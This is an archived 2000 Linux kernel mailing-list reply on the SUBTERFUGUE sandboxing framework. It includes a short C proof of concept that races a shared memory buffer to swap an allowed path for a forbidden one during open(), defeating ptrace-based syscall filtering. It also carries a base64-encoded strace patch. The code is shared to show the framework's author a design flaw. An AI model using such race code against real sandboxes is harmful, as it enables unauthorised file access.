Return-Path: <owner-linux-kernel-outgoing@vger.rutgers.edu>
Received: by vger.rutgers.edu via listexpand id <S154008AbQBGRMD>; Mon, 7 Feb 2000 12:12:03 -0500
Received: by vger.rutgers.edu id <S154025AbQBGRHv>; Mon, 7 Feb 2000 12:07:51 -0500
Received: from atrey.karlin.mff.cuni.cz ([195.113.31.123]:4200 "EHLO atrey.karlin.mff.cuni.cz") by vger.rutgers.edu with ESMTP id <S154054AbQBGRFh>; Mon, 7 Feb 2000 12:05:37 -0500
Message-ID: <20000207215856.B364@bug.ucw.cz>
Date: Mon, 7 Feb 2000 21:58:56 +0100
From: Pavel Machek <pavel@suse.cz>
To: Mike Coleman <mkc@kc.net>, linux-kernel@vger.rutgers.edu
Subject: Re: [ANNOUNCE] SUBTERFUGUE 0.0
References: <m12HhOU-000WVvC@microdog>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary=X1bOJ3K7DJ5YkBrT
X-Mailer: Mutt 0.93i
In-Reply-To: <m12HhOU-000WVvC@microdog>; from Mike Coleman on Mon, Feb 07, 2000 at 12:11:30AM -0600
Sender: owner-linux-kernel@vger.rutgers.edu


--X1bOJ3K7DJ5YkBrT
Content-Type: text/plain; charset=us-ascii

Hi!

> I'm pleased to announce the first public release of SUBTERFUGUE.  Below is a
> brief description from the README.

I'll take a look (really, I'm doing something pretty close as my
diploma thesis). Meanwhile: take a look at this program. It is _very_
nasty, and I guess it is able to bypass your protection (Imagine you
want to restrict access to /heslo, but leave access to /reklama open.)

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void
main(void)
{
  char *c = 0x94000000;
  open( "/tmp/delme", O_RDWR );
  mmap( c, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED, 3, 0 );
  *c = 0;
  if (fork()) {
    while(1) {
      strcpy( c, "/reklama" );    
      strcpy( c, "/heslo" );
    }
  } else
    while (1)
      open( c, 0 );
}

> SUBTERFUGUE is a framework for observing and playing with the reality of
> software; it's a foundation for building tools to do tracing, sandboxing, and
> many other things. You could think of it as "strace meets expect."

When I was faced with this task, I added ability to strace to ask if
it should do syscalls. Patch is rather small and attached. If there's
enough interest, I might even be able to push -y option into standart
distribution.

								Pavel

-- 
I'm pavel@ucw.cz. "In my country we have almost anarchy and I don't care."
Panos Katsaloulis describing me w.r.t. patents me at discuss@linmodems.org

--X1bOJ3K7DJ5YkBrT
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="strace.main.diff#gz"

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

--X1bOJ3K7DJ5YkBrT--

-
To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
the body of a message to majordomo@vger.rutgers.edu
Please read the FAQ at http://www.tux.org/lkml/
